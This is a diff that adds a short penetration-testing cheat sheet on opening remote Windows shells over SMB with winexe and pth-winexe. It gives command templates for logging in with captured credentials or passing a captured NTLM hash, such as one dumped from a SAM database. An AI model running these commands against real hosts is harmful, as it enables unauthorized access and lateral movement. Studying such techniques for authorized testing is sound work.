@@ -1,1 +1,10 @@
+Remote Shells w/ winexe & pth-winexe on Windows
+If you’re able to come across credentials or NTLM hashes for a Windows box that has SMB enabled, you may be able to leverage the tool called winexe to gain a shell. If you have captured a NTLM hash, say from dumping a SAM database, you may be able to pass-the-hash.
 
+Basic syntax w/ credentials:
+winexe -U <domain/username>%<password> //<targetIP> cmd.exe
+
+Basic syntax w/ NTLM hash (pass the hash technique):
+pth-winexe -U <domain/username>%<hash> //<targetIP> cmd.exe
+
+Additional details about the command can be found here. https://tools.kali.org/maintaining-access/winexe
